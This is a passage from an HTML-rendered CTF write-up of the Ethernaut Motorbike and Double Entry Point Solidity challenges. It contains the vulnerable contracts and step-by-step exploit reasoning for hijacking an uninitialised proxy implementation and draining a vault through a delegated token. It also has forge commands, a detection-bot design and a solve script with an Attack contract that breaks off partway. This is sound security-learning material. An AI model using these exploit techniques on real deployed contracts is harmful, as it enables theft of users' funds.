</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_getAddressSlot</span><span>(bytes32 slot) </span><span style=color:#795da3;font-weight:700>internal pure returns </span><span>(AddressSlot storage r) {
</span><span>        assembly {
</span><span>            r_slot :</span><span style=color:#a71d5d;font-weight:700>= </span><span>slot
</span><span>        }
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Engine is Initializable {
</span><span>    </span><span style=color:#969896;font-style:italic>// keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
</span><span>    bytes32 internal constant _IMPLEMENTATION_SLOT </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span>;
</span><span>
</span><span>    address public upgrader;
</span><span>    uint256 public horsePower;
</span><span>
</span><span>    struct AddressSlot {
</span><span>        address value;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>initialize</span><span>() </span><span style=color:#795da3;font-weight:700>external initializer </span><span>{
</span><span>        horsePower </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>1000</span><span>;
</span><span>        upgrader </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.sender;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// Upgrade the implementation of the proxy to `newImplementation`
</span><span>    </span><span style=color:#969896;font-style:italic>// subsequently execute the function call
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>upgradeToAndCall</span><span>(address newImplementation, bytes memory data) </span><span style=color:#795da3;font-weight:700>external payable </span><span>{
</span><span>        </span><span style=color:#795da3;font-weight:700>_authorizeUpgrade</span><span>();
</span><span>        </span><span style=color:#795da3;font-weight:700>_upgradeToAndCall</span><span>(newImplementation, data);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// Restrict to upgrader role
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_authorizeUpgrade</span><span>() </span><span style=color:#795da3;font-weight:700>internal view </span><span>{
</span><span>        </span><span style=color:#62a35c>require</span><span>(msg.sender </span><span style=color:#a71d5d;font-weight:700>== </span><span>upgrader, </span><span style=color:#183691>"Can't upgrade"</span><span>);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_upgradeToAndCall</span><span>(
</span><span>        address newImplementation,
</span><span>        bytes memory data
</span><span>    ) </span><span style=color:#795da3;font-weight:700>internal </span><span>{
</span><span>        </span><span style=color:#969896;font-style:italic>// Initial upgrade and setup call
</span><span>        </span><span style=color:#795da3;font-weight:700>_setImplementation</span><span>(newImplementation);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(data.length </span><span style=color:#a71d5d;font-weight:700>> </span><span style=color:#0086b3>0</span><span>) {
</span><span>            (bool success,) </span><span style=color:#a71d5d;font-weight:700>= </span><span>newImplementation.</span><span style=color:#795da3;font-weight:700>delegatecall</span><span>(data);
</span><span>            </span><span style=color:#62a35c>require</span><span>(success, </span><span style=color:#183691>"Call failed"</span><span>);
</span><span>        }
</span><span>    }
</span><span>    
</span><span>    </span><span style=color:#969896;font-style:italic>// Stores a new address in the EIP1967 implementation slot.
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_setImplementation</span><span>(address newImplementation) </span><span style=color:#795da3;font-weight:700>private </span><span>{
</span><span>        </span><span style=color:#62a35c>require</span><span>(Address.</span><span style=color:#795da3;font-weight:700>isContract</span><span>(newImplementation), </span><span style=color:#183691>"ERC1967: new implementation is not a contract"</span><span>);
</span><span>        
</span><span>        AddressSlot storage r;
</span><span>        assembly {
</span><span>            r_slot :</span><span style=color:#a71d5d;font-weight:700>= </span><span>_IMPLEMENTATION_SLOT
</span><span>        }
</span><span>        r.value </span><span style=color:#a71d5d;font-weight:700>= </span><span>newImplementation;
</span><span>    }
</span><span>}
</span></code></pre><ul><li>Goal</ul><ol><li>Would you be able to selfdestruct its engine and make the motorbike unusable ?</ol><ul><li>Solution</ul><ol><li>This is another upgradeable proxy contract setup. Motorbike contract is the proxy contract which forwards the calls to the implementation contract Engine.<li>This time no storage collison is happened.<li>We need to change the <code>updrader</code> of the Engine contract and <code>selfdestruct</code> the Engine contract.<li>I dont see any function that selfdestructs Engine contract. So, we have to write an Attack contract which has the selfdestruct function and change the implementation address.<li>We see only one time the <code>upgrader</code> was assigned inside Engine contract, that is inside <code>initialize()</code> function. And this initialize function was called inside the constructor of the Motobike.<li>But observe that this call was done using <code>delegatecall</code>, which is done in the context of the Motorbike. Not the Engine contract.<li>This means the <code>initialize()</code> function can be called again as the <code>intializer</code> modfier not updated.<li>By calling <code>intialize()</code> we will become the updrader of the Engine contract.<li>Now, we can update the implementation addres by calling <code>upgradeToAndCall()</code> function and pass the data as the signature of the <code>destructEngine()</code> function to be called by the Engine contract.<li>This will destruct the Engine contract, because the call was done using <code>delegatecall</code> so the storage of the Engine will be affected.</ol><p><code>MotorbikeSolve.s.sol</code><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/MotorbikeSolve.s.sol:MotorbikeSolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=26-double-entry-point>26 Double Entry Point</h1><p><code>DoubleEntryPoint.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"openzeppelin-contracts/contracts/access/Ownable.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"openzeppelin-contracts/contracts/token/ERC20/ERC20.sol"</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>interface </span><span>DelegateERC20 {
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>delegateTransfer</span><span>(address to, uint256 value, address origSender) </span><span style=color:#795da3;font-weight:700>external returns </span><span>(bool);
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>interface </span><span>IDetectionBot {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>handleTransaction</span><span>(address user, bytes calldata msgData) </span><span style=color:#795da3;font-weight:700>external</span><span>;
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>interface </span><span>IForta {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>setDetectionBot</span><span>(address detectionBotAddress) </span><span style=color:#795da3;font-weight:700>external</span><span>;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>notify</span><span>(address user, bytes calldata msgData) </span><span style=color:#795da3;font-weight:700>external</span><span>;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>raiseAlert</span><span>(address user) </span><span style=color:#795da3;font-weight:700>external</span><span>;
</span><span>}
</span><span>
</span><span>contract Forta is IForta {
</span><span>  </span><span style=color:#795da3;font-weight:700>mapping</span><span>(address </span><span style=color:#a71d5d;font-weight:700>=> </span><span>IDetectionBot) public usersDetectionBots;
</span><span>  </span><span style=color:#795da3;font-weight:700>mapping</span><span>(address </span><span style=color:#a71d5d;font-weight:700>=> </span><span>uint256) public botRaisedAlerts;
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>setDetectionBot</span><span>(address detectionBotAddress) </span><span style=color:#795da3;font-weight:700>external override </span><span>{
</span><span>      usersDetectionBots[msg.sender] </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>IDetectionBot</span><span>(detectionBotAddress);
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>notify</span><span>(address user, bytes calldata msgData) </span><span style=color:#795da3;font-weight:700>external override </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(usersDetectionBots[user]) </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#0086b3>0</span><span>)) </span><span style=color:#a71d5d;font-weight:700>return</span><span>;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>try </span><span>usersDetectionBots[user].</span><span style=color:#795da3;font-weight:700>handleTransaction</span><span>(user, msgData) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span>;
</span><span>    } </span><span style=color:#a71d5d;font-weight:700>catch </span><span>{}
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>raiseAlert</span><span>(address user) </span><span style=color:#795da3;font-weight:700>external override </span><span>{
</span><span>      </span><span style=color:#a71d5d;font-weight:700>if</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(usersDetectionBots[user]) </span><span style=color:#a71d5d;font-weight:700>!= </span><span>msg.sender) </span><span style=color:#a71d5d;font-weight:700>return</span><span>;
</span><span>      botRaisedAlerts[msg.sender] </span><span style=color:#a71d5d;font-weight:700>+= </span><span style=color:#0086b3>1</span><span>;
</span><span>  } 
</span><span>}
</span><span>
</span><span>contract CryptoVault {
</span><span>    address public sweptTokensRecipient;
</span><span>    </span><span style=color:#0086b3>IERC20 </span><span>public underlying;
</span><span>
</span><span>    </span><span style=color:#795da3;font-weight:700>constructor</span><span>(address recipient) {
</span><span>        sweptTokensRecipient </span><span style=color:#a71d5d;font-weight:700>= </span><span>recipient;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>setUnderlying</span><span>(address latestToken) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>        </span><span style=color:#62a35c>require</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(underlying) </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#0086b3>0</span><span>), </span><span style=color:#183691>"Already set"</span><span>);
</span><span>        underlying </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>IERC20</span><span>(latestToken);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>/*
</span><span style=color:#969896;font-style:italic>    ...
</span><span style=color:#969896;font-style:italic>    */
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>sweepToken</span><span>(IERC20 token) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>        </span><span style=color:#62a35c>require</span><span>(token </span><span style=color:#a71d5d;font-weight:700>!= </span><span>underlying, </span><span style=color:#183691>"Can't transfer underlying token"</span><span>);
</span><span>        token.</span><span style=color:#795da3;font-weight:700>transfer</span><span>(sweptTokensRecipient, token.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(this)));
</span><span>    }
</span><span>}
</span><span>
</span><span>contract LegacyToken is </span><span style=color:#795da3;font-weight:700>ERC20</span><span>(</span><span style=color:#183691>"LegacyToken"</span><span>, </span><span style=color:#183691>"LGT"</span><span>), </span><span style=color:#795da3;font-weight:700>Ownable</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#0086b3>0</span><span>)) { </span><span style=color:#969896;font-style:italic>// added address(0) to escape compiler errors
</span><span>    DelegateERC20 public delegate;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>mint</span><span>(address to, uint256 amount) </span><span style=color:#795da3;font-weight:700>public onlyOwner </span><span>{
</span><span>        </span><span style=color:#795da3;font-weight:700>_mint</span><span>(to, amount);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>delegateToNewContract</span><span>(DelegateERC20 newContract) </span><span style=color:#795da3;font-weight:700>public onlyOwner </span><span>{
</span><span>        delegate </span><span style=color:#a71d5d;font-weight:700>= </span><span>newContract;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>transfer</span><span>(address to, uint256 value) </span><span style=color:#795da3;font-weight:700>public override returns </span><span>(bool) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(delegate) </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#0086b3>0</span><span>)) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return </span><span>super.</span><span style=color:#795da3;font-weight:700>transfer</span><span>(to, value);
</span><span>        } </span><span style=color:#a71d5d;font-weight:700>else </span><span>{
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return </span><span>delegate.</span><span style=color:#795da3;font-weight:700>delegateTransfer</span><span>(to, value, msg.sender);
</span><span>        }
</span><span>    }
</span><span>}
</span><span>
</span><span>contract DoubleEntryPoint is </span><span style=color:#795da3;font-weight:700>ERC20</span><span>(</span><span style=color:#183691>"DoubleEntryPointToken"</span><span>, </span><span style=color:#183691>"DET"</span><span>), DelegateERC20, </span><span style=color:#795da3;font-weight:700>Ownable </span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#0086b3>0</span><span>)) { </span><span style=color:#969896;font-style:italic>// added address(0) to escape compiler errors
</span><span>    address public cryptoVault;
</span><span>    address public player;
</span><span>    address public delegatedFrom;
</span><span>    Forta public forta;
</span><span>
</span><span>    </span><span style=color:#795da3;font-weight:700>constructor</span><span>(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) {
</span><span>        delegatedFrom </span><span style=color:#a71d5d;font-weight:700>= </span><span>legacyToken;
</span><span>        forta </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Forta</span><span>(fortaAddress);
</span><span>        player </span><span style=color:#a71d5d;font-weight:700>= </span><span>playerAddress;
</span><span>        cryptoVault </span><span style=color:#a71d5d;font-weight:700>= </span><span>vaultAddress;
</span><span>        </span><span style=color:#795da3;font-weight:700>_mint</span><span>(cryptoVault, </span><span style=color:#0086b3>100 </span><span>ether);
</span><span>    }
</span><span>
</span><span>    modifier </span><span style=color:#795da3;font-weight:700>onlyDelegateFrom</span><span>() {
</span><span>        </span><span style=color:#62a35c>require</span><span>(msg.sender </span><span style=color:#a71d5d;font-weight:700>== </span><span>delegatedFrom, </span><span style=color:#183691>"Not legacy contract"</span><span>);
</span><span>        _;
</span><span>    }
</span><span>
</span><span>    modifier </span><span style=color:#795da3;font-weight:700>fortaNotify</span><span>() {
</span><span>        address detectionBot </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>address</span><span>(forta.</span><span style=color:#795da3;font-weight:700>usersDetectionBots</span><span>(player));
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Cache old number of bot alerts
</span><span>        uint256 previousValue </span><span style=color:#a71d5d;font-weight:700>= </span><span>forta.</span><span style=color:#795da3;font-weight:700>botRaisedAlerts</span><span>(detectionBot);
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Notify Forta
</span><span>        forta.</span><span style=color:#795da3;font-weight:700>notify</span><span>(player, msg.data);
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Continue execution
</span><span>        _;
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Check if alarms have been raised
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if</span><span>(forta.</span><span style=color:#795da3;font-weight:700>botRaisedAlerts</span><span>(detectionBot) </span><span style=color:#a71d5d;font-weight:700>> </span><span>previousValue) </span><span style=color:#795da3;font-weight:700>revert</span><span>(</span><span style=color:#183691>"Alert has been triggered, reverting"</span><span>);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>delegateTransfer</span><span>(
</span><span>        address to,
</span><span>        uint256 value,
</span><span>        address origSender
</span><span>    ) </span><span style=color:#795da3;font-weight:700>public override onlyDelegateFrom fortaNotify returns </span><span>(bool) {
</span><span>        </span><span style=color:#795da3;font-weight:700>_transfer</span><span>(origSender, to, value);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>true</span><span>;
</span><span>    }
</span><span>}
</span></code></pre><ul><li>Goal</ul><ol><li>Drain the underlying token balance of CryptoVault and Write a detection bot to catch this bug.</ol><ul><li>Solution</ul><ol><li>There are four contract in total CryptoVault, DoubleEntryPoint, LegacyToken and Forta.<li>CryptoVault implemented <code>sweepToken()</code> function which allows us to sweep all the tokens from the CryptoVault except the <code>underlying</code> tokens.<li>The underlying token is an instance of the DET token implemented in the DoubleEntryPoint contract definition and the CryptoVault holds 100 units of it. Additionally the CryptoVault also holds 100 of LegacyToken LGT.<li>LegacyToken is simple ERC20 token which is already deployed and minted 100 tokens for the CryptoVault.<li>LegacyToken also have function <code>transfer()</code> which is where the catch is,</ol><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span> </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>transfer</span><span>(address to, uint256 value) </span><span style=color:#795da3;font-weight:700>public override returns </span><span>(bool) {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(delegate) </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#0086b3>0</span><span>)) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span>super.</span><span style=color:#795da3;font-weight:700>transfer</span><span>(to, value);
</span><span>    } </span><span style=color:#a71d5d;font-weight:700>else </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span>delegate.</span><span style=color:#795da3;font-weight:700>delegateTransfer</span><span>(to, value, msg.sender);
</span><span>    }
</span><span>}
</span></code></pre><ol start=6><li>I checked that the <code>delegate</code> is the address of the DoubleEntryPoint Token. And it is assigned to delegate in LegacyToken contract.<li>So, whenever we call the <code>transfer()</code> in LegacyToken it will call the <code>delegate.delegateTransfer(to, value, msg.sender);</code>.<li>Here the <code>delegate</code> == <code>DET</code> address. Which means the LegacyToken contract is calling the <code>delegateTransfer()</code> function of DoubleEntryPoint contract.<li>Lets see what this function is doing,</ol><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>delegateTransfer</span><span>(
</span><span>    address to,
</span><span>    uint256 value,
</span><span>    address origSender
</span><span>) </span><span style=color:#795da3;font-weight:700>public override onlyDelegateFrom fortaNotify returns </span><span>(bool) {
</span><span>    </span><span style=color:#795da3;font-weight:700>_transfer</span><span>(origSender, to, value);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>true</span><span>;
</span><span>}
</span></code></pre><ol start=10><li>Its sending the <code>DET</code> tokens to the <code>to</code> address from the <code>origSender</code> of <code>value</code>. Lets see what are these values.<li>When this function executes it transfers DET tokens of <code>origSender</code> to the <code>to</code> address. CryptoVault holds 100 DET tokens.<li>So, if the <code>origSender</code> is CryptoVault and the call to <code>delegateTransfer()</code> was made by <code>LegacyToken</code> and no alerts from the <code>fortaNotify</code> will transfer DET tokens from CryptoVault. (Ignore fortaNotify as they are not yet implmented)<li>The <code>delegateTransfer()</code> is called by LegacyToken contract from the <code>transfer()</code> function. The <code>origSender</code> is the <code>msg.sender</code> of transfer() function in LegacyToken.<li>So, we have to make the CryptoVault to call the <code>transfer()</code> function of the LegacyToken.<li>We see the one <code>transfer()</code> call is made on the <code>token</code> by CryptoVault inside <code>sweepToken()</code> function.</ol><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>sweepToken</span><span>(IERC20 token) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    </span><span style=color:#62a35c>require</span><span>(token </span><span style=color:#a71d5d;font-weight:700>!= </span><span>underlying, </span><span style=color:#183691>"Can't transfer underlying token"</span><span>);
</span><span>    token.</span><span style=color:#795da3;font-weight:700>transfer</span><span>(sweptTokensRecipient, token.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(this)));
</span><span>}
</span></code></pre><ol start=16><li>To make the LegacyToken <code>tranfer()</code> called by the CryptoVault, we need to pass the LegacyToken instance to the <code>sweepToken()</code> function.<li>Now the CryptoVault balance of DET token becomes zero.<li>We identified the bug and sweeped out the DET tokens of the CryptoVault.<li>Now we have to write a <code>detectionbot</code> to catch this bug. We are given with <code>Forta</code> interface which can be used to build the bot.<li>We have to build a bot that raises an alert when we see any transaction that transfers DET tokens from CryptoVault.<li>The <code>msg.data</code> that received at <code>fortNotify()</code>,</ol><pre style=color:#323232;background-color:#fff><code><span>data = &lt;delegateTransfer() signature> &lt;to> &lt;value> &lt;origSender>
</span></code></pre><ol start=22><li>If we access <code>msg.data</code> inside <code>handleTransaction()</code>,</ol><pre style=color:#323232;background-color:#fff><code><span>msg.data = &lt;handleTransaction() signature> &lt;user> &lt;data>
</span></code></pre><ol start=23><li>We need to extract <code>origSender</code> from the <code>msg.data</code> inside <code>handleTransaction()</code> function implemented in our bot contract.<li>Lets see how the calldata at <code>handleTransaction()</code> is looks like,</ol><pre style=color:#323232;background-color:#fff><code><span>0x00 : handleTransaction signature[4 bytes]
</span><span>0x04 : 0000....0000 // &lt;user> address
</span><span>0x24 : 0000....0000 // offset of the &lt;data>
</span><span>0x44 : 0000....0000 // length of the &lt;data>
</span><span>0x64 : 0000....0000 // &lt;data>
</span><span>    &lt;data>
</span><span>    0x64 : &lt;delegateTransfer() signature> [4 bytes]
</span><span>    0x68 : 0000....0000 // &lt;to> address
</span><span>    0x88 : 0000....0000 // &lt;value>
</span><span>    0xA8 : 0000....0000 // &lt;origSender>
</span></code></pre><ol start=25><li>So, the <code>origSender</code> is from the <code>0xA8</code> byte of the <code>msg.data</code> inside <code>handleTransaction()</code> function.<li>We can use <code>calldataload</code> opcode to access the <code>origSender</code>. And if the origSender is equals to CryptoVault then raise an alert.<li>Now our bot is ready, we have to deploy it and register the bot at <code>Forta</code> contract.<li>And that's enough to solve this challenge.</ol><p><code>DoubleEntryPointSolve.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"../src/DoubleEntryPoint.sol"</span><span>;
</span><span>
</span><span>contract DoubleEntryPointSolve is Script {
</span><span>    DoubleEntryPoint public det </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>DoubleEntryPoint</span><span>(</span><span style=color:#0086b3>0xaf69EbD36B5465a0764Db0FE4dE0040780F6533C</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        address cryptovault </span><span style=color:#a71d5d;font-weight:700>= </span><span>det.</span><span style=color:#795da3;font-weight:700>cryptoVault</span><span>();
</span><span>        address player </span><span style=color:#a71d5d;font-weight:700>= </span><span>det.</span><span style=color:#795da3;font-weight:700>player</span><span>();
</span><span>        address delegatedFrom </span><span style=color:#a71d5d;font-weight:700>= </span><span>det.</span><span style=color:#795da3;font-weight:700>delegatedFrom</span><span>(); </span><span style=color:#969896;font-style:italic>// Legacy Token Address
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"CryptoVault : "</span><span>, cryptovault);
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player : "</span><span>, player);
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"LGT : "</span><span>, delegatedFrom);
</span><span>
</span><span>        LegacyToken lgt </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>LegacyToken</span><span>(delegatedFrom);
</span><span>        CryptoVault cv </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>CryptoVault</span><span>(cryptovault);
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"CryptoVault balance of DET : "</span><span>, det.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(cryptovault));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"CryptoVault balance of LGT : "</span><span>, lgt.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(cryptovault));
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Delegate of LGT : "</span><span>, </span><span style=color:#795da3;font-weight:700>address</span><span>(lgt.</span><span style=color:#795da3;font-weight:700>delegate</span><span>()));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"DET : "</span><span>, </span><span style=color:#795da3;font-weight:700>address</span><span>(det));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Both are same"</span><span>);
</span><span>
</span><span>        Forta forta </span><span style=color:#a71d5d;font-weight:700>= </span><span>det.</span><span style=color:#795da3;font-weight:700>forta</span><span>();
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"registering bot........."</span><span>);
</span><span>
</span><span>        DetectionBot bot </span><span style=color:#a71d5d;font-weight:700>= new </span><span>DetectionBot();
</span><span>
</span><span>        forta.</span><span style=color:#795da3;font-weight:700>setDetectionBot</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(bot));
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"BOT ALERTS Before exploit : "</span><span>,forta.</span><span style=color:#795da3;font-weight:700>botRaisedAlerts</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(bot)));
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Exploiting DET..........."</span><span>);
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// new Attack().exploit();  // reverts because bot detects the exploit
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"CryptoVault balance of DET : "</span><span>, det.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(cryptovault));
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"BOT ALERTS After exploit : "</span><span>,forta.</span><span style=color:#795da3;font-weight:700>botRaisedAlerts</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(bot)));
</span><span>
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Attack{
</span><span>    DoubleEntryPoint public det </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>DoubleEntryPoint</span><span>(</span><span style=color:#0086b3>0xaf69EbD36B5465a0764Db0FE4dE0040780F6533C</span><span>);
</span><span>    address public  cryptovault </span><span style=color:#a71d5d;font-weight:700>= </span><span>det.</span><span style=color:#795da3;font-weight:700>cryptoVault</span><span>();
</span><span>    address public player </span><span style=color:#a71d5d;font-weight:700>= </span><span>det.</span><span style=color:#795da3;font-weight:700>player</span><span>();
</span><span>    address public delegatedFrom </span><span style=color:#a71d5d;font-weight:700>= </span><span>det.</span><span style=color:#795da3;font-weight:700>delegatedFrom</span><span>(); </span><span style=color:#969896;font-style:italic>// Legacy Token Address
